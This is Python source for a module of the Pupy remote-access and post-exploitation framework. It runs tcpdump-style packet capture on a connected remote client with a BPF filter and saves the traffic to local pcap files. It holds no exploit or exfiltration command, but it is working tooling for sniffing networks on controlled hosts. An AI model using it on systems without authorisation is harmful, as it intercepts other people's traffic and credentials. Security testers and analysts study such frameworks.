# -*- coding: UTF8 -*-
# Copyright (c) 2017, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
import sys
import subprocess
import threading
import Queue
import time
import readline
from modules.lib.windows.winpcap import init_winpcap
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import datetime
from pupylib import * # placed after scapy inport to avoid scapy's config collision

__class_name__="TcpdumpModule"

def gen_cb_function(pcap_writer=None, print_summary=True):
    def pkt_callback(pkt):
        pkt=Ether(obtain(str(pkt)))
        if pcap_writer is not None:
            pcap_writer.write(pkt)
        if print_summary:
            print pkt.summary()
    return pkt_callback

@config(cat="network", tags=["sniff", "pcap"])
class TcpdumpModule(PupyModule):
    """ module to reproduce some of the classic tcpdump tool functions """

    max_clients=1
    dependencies=['scapy', 'tcpdump']

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog='tcpdump.py', description=self.__doc__)
        self.arg_parser.add_argument("-s", "--save-pcap", action="store_true", help="save to a pcap file")
        self.arg_parser.add_argument("--count", type=int, default=0, help="sniff at max n packets")
        self.arg_parser.add_argument("-i", "--iface", default=None, help="change default iface")
        self.arg_parser.add_argument("--timeout", type=int, default=None, help="stop the capture after timeout seconds")
        self.arg_parser.add_argument("--bpf", required=True, help="use a BPF (Warning: It is highly advised to whitelist pupy's shell IP/PORT you are currently using to avoid a nasty Larsen effect)") #yup mandatory cause you have to put pupy's IP/PORT anyway
        #self.arg_parser.add_argument("command", choices=["start", "stop"])
        self.sniff_sess=None


    def run(self, args):
        init_winpcap(self)
        pktwriter=None
        if args.save_pcap:
            try:
                os.makedirs(os.path.join("data","pcaps"))
            except Exception:
                pass
            filepath=os.path.join("data","pcaps","cap_"+self.client.short_name()+"_"+str(datetime.datetime.now()).replace(" ","_").replace(":","-")+".pcap")
            pktwriter = PcapWriter(filepath, append=True, sync=True)
            self.info("Packets printed will be streamed into %s ..."%filepath)
            

        if args.timeout==None and args.count==0:
            raise PupyModuleError("--timeout or --count options are mandatory for now.")#TODO patch scapy to have an interruptible sniff() function

        self.sniff_sess=self.client.conn.modules["tcpdump"].SniffSession(gen_cb_function(pcap_writer=pktwriter), bpf=args.bpf, timeout=args.timeout, count=args.count, iface=args.iface)
        #with redirected_stdio(self.client.conn):
        self.sniff_sess.start()

                




